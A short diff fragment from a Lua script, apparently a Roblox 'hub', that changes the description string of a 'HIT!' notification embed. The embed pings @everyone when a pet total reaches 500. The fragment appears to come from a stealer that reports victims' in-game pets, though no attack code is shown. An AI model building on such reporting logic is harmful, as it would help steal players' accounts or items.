@@ -173,4 +173,4 @@ if #sortedPets > 0 then
         content = (grandTotal >= 500 and "@everyone" or ""),
         embeds = {{
             title = "MONDEUR HUB | 🦊 HIT!",
-            description = "
+            description = "Mondeur | chafya Handsome"
